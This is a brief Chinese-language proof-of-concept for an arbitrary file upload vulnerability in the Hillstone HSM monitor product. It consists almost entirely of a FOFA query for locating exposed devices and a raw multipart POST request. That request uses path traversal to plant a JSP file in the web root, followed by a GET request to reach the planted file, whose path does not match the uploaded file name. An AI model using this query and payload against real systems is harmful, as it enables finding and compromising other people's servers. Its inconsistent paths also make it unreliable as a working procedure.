# 山石网科HSM-monitor存在任意文件上传

山石网科存在任意文件上传漏洞，可以获取服务器权限

## fofa

```javascript
body="login_hsm-all.css"
```

## poc

```javascript
POST /ft//stoneos/monitor?sn=1&fileName=../../../../hsmprogram/service/application/WebDaemon/errors/2.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="data"; filename="1.txt"
Content-Type: text/plain

<% out.println("202cb962ac59075b964b07152d234b70");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryABC123--
```
文件上传访问shll地址
```javascript
GET /errors/2111.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
```
